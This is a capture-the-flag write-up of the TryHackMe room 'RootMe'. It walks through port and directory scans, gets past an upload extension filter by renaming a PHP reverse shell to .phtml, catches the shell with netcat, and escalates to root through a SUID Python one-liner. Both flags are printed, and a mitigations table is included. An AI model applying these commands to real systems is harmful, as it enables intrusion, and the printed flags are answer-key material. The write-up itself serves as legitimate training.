```
 ██████╗  ██████╗  ██████╗ ████████╗███╗   ███╗███████╗
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝████╗ ████║██╔════╝
 ██████╔╝██║   ██║██║   ██║   ██║   ██╔████╔██║█████╗
 ██╔══██╗██║   ██║██║   ██║   ██║   ██║╚██╔╝██║██╔══╝
 ██║  ██║╚██████╔╝╚██████╔╝   ██║   ██║ ╚═╝ ██║███████╗
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚═╝╚══════╝
            TryHackMe: RootMe
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-07 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~9 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80)
- [x] Web directory brute force: found `/panel/` and `/uploads/`
- [x] Attempted `.php` upload: blocked
- [x] Bypassed extension filter with `.phtml`
- [x] Caught reverse shell as `www-data`
- [x] Located user flag at `/var/www/user.txt`
- [x] Enumerated SUID binaries
- [x] Identified SUID bit set on `/usr/bin/python2.7`
- [x] Escalated to root via Python SUID GTFOBins
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🐚 Netcat: reverse shell listener
- 🐍 Python: SUID privilege escalation

---

## ⚡ TL;DR

A file upload panel at `/panel/` blocked `.php` but accepted `.phtml`, landing a `www-data` shell. SUID enumeration surfaced an unusual find: `/usr/bin/python2.7` with the SUID bit set: something that should never exist outside a CTF. A single Python one-liner spawned a root shell.

---

## 📖 Introduction

Today's patient is **RootMe**: a box that tells you exactly what to do right there in the name and then helpfully leaves the door ajar. It's a deceptively clean machine: just a web upload panel, a woefully incomplete file extension filter, and a Python interpreter that someone left running with root-level permissions. The escalation path is about as subtle as a flashing arrow labelled "this way to root." The real lesson here isn't the exploit: it's learning to spot the one file in a thousand-line SUID dump that genuinely shouldn't be there.

### Prerequisites

Readers are assumed to know:

- What file upload vulnerabilities are and why extension filtering matters
- How to catch a reverse shell with Netcat
- What SUID binaries are and why they matter for privilege escalation
- Basic Python one-liners for shell spawning

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.49.157.64 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Two ports again. Nmap notes the `PHPSESSID` cookie is missing the `HttpOnly` flag: same pattern as Neighbour, same implication: this is a PHP application and session security was not a priority. The HTTP title is `HackIT - Home`, which radiates beginner CTF energy.

### Web Directory Enumeration

*(~3 mins into the box)*

*Feroxbuster with PHP, TXT, and HTML extensions:*

```bash
feroxbuster -u http://10.49.157.64 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
200  http://10.49.157.64/index.php
301  http://10.49.157.64/panel       # ^^^ file upload panel
301  http://10.49.157.64/uploads     # ^^^ where uploaded files land
200  http://10.49.157.64/panel/index.php
```

Two finds that belong together: `/panel/` provides an upload form, `/uploads/` is the publicly browsable directory where files go. This pairing is the entire attack surface: upload a shell to `/panel/`, trigger it from `/uploads/`.

---

## 🚪 Foothold

*(~6 mins into the box)*

### File Upload: Extension Filter Bypass

**What is a file upload vulnerability?** Web applications that accept file uploads need to ensure users can't upload executable server-side code. A common mitigation is to filter file extensions, but as with any denylist approach, the filter is only as complete as whoever wrote it. PHP files can be executed by Apache under several extensions beyond `.php`: notably `.phtml`, `.php5`, `.phar`, and others depending on server configuration. If the filter blocks `.php` but not its siblings, the protection is cosmetic.

*Attempting the obvious upload first: `.php` extension:*

```
# upload result
PHP não é permitido!
```

Portuguese for "PHP is not allowed." The filter blocks `.php` by name, which is the most recognisable extension but not the only one Apache will execute as PHP.

*Renaming the PentestMonkey PHP reverse shell and re-uploading:*

```bash
cp php-reverse-shell.php php-reverse-shell.phtml
```

The `.phtml` upload was accepted without complaint. The filter had never heard of it.

*Setting up the listener, then navigating to the uploaded file at `/uploads/` to trigger execution:*

```bash
nc -nlvp 4444
```

```
# reverse shell callback
connect to [192.168.133.233] from (UNKNOWN) [10.49.157.64] 32968
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

*Stabilising with Python PTY:*

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🐚 Shell / Access

*(~8 mins into the box)*

We land as `www-data`. Three home directories exist: `rootme`, `test`, and `ubuntu`: none readable from this account. The user flag wasn't in the obvious `/home/` locations.

*Hunting for the flag by filename:*

```bash
find / -name user.txt 2>/dev/null
```

```
/var/www/user.txt   # ^^^ non-standard location
```

```bash
cat /var/www/user.txt
```

```
THM{y0u_g0t_a_sh3ll}
```

The flag lived in the web root's parent directory rather than a home folder: a mild departure from convention that required `find` rather than a straight `cat`.

---

## 📈 Escalation

*(~10 mins into the box)*

### SUID Enumeration

**What are SUID binaries?** The Set User ID (SUID) permission bit on an executable means it runs with the *file owner's* privileges rather than the *calling user's*. When a binary owned by root has SUID set, anyone who executes it effectively runs it as root: regardless of who they are. This is intentional for specific binaries like `passwd` (which needs root to edit `/etc/shadow`) but catastrophic for general-purpose tools or interpreters.

*Finding all SUID binaries on the system:*

```bash
find / -perm -4000 -type f 2>/dev/null
```

The output is long. Most entries are expected system binaries. One entry is not:

```
-rwsr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7
```

In a standard Linux installation, **interpreters never have the SUID bit set**. `python`, `perl`, `ruby`, `node`: none of them should appear in a SUID scan. When they do, it means any user can run arbitrary code as root through them.

### SUID Python: GTFOBins

The escalation is a single Python one-liner. `os.execl()` replaces the current process with a new one: `/bin/sh`, and the `-p` flag tells `sh` to preserve the effective UID (root) rather than dropping it back to the calling user's UID.

*Spawning a root shell via the SUID Python binary:*

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
# whoami
root
```

*Collecting the root flag:*

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## 💥 Exploitation

The complete attack chain:

1. **`.phtml` upload bypass** at `/panel/`: filter blocked `.php` but not `.phtml`, landing a reverse shell as `www-data`
2. **SUID Python2.7**: interpreter with root SUID set, executed a one-liner to spawn a root shell

---

## 🐇 Rabbit Holes

### Exploring `/home/rootme/` and `/home/test/`

After landing the shell, both home directories were investigated. Neither was readable by `www-data`: permissions were locked down. `.sudo_as_admin_successful` in `/home/rootme/` is an empty marker file created when a user successfully runs `sudo` for the first time; it contains no useful information. The user flag ultimately wasn't in either home directory anyway.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{y0u_g0t_a_sh3ll}` | `/var/www/user.txt` |
| Root | `THM{pr1v1l3g3_3sc4l4t10n}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| File upload filter: `.phtml` not blocked | High | Use a strict allowlist of safe extensions (`.jpg`, `.png`, `.pdf` only); validate file content via magic bytes, not just the name; store uploads outside the webroot or disable PHP execution in the uploads directory via Apache config |
| SUID bit set on Python interpreter | Critical | Remove the SUID bit immediately: `chmod u-s /usr/bin/python2.7`; audit all SUID binaries regularly with `find / -perm -4000`; no interpreter should ever have SUID |
| Missing `HttpOnly` flag on `PHPSESSID` | Low | Set `session.cookie_httponly = 1` in `php.ini` |
| User flag in web-accessible directory | Medium | Store flags and sensitive files outside the webroot; `/var/www/` is partially web-accessible depending on configuration |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** When reviewing SUID binaries, the question isn't "do I recognise this binary": it's "should this binary *ever* have SUID set?" Interpreters, scripting tools, and package managers on that list are immediate red flags. A single `find / -perm -4000` run and thirty seconds on GTFOBins is often all that stands between `www-data` and root.

---

## 🔁 If I Did It Again

Run the SUID search before looking for other escalation vectors: on this box it was the very first thing that mattered, and filtering the output mentally for "things that should never have SUID" is a skill worth drilling until it's automatic.

---

## 🔚 Changelog

*Last updated: 2026-06-07*

---
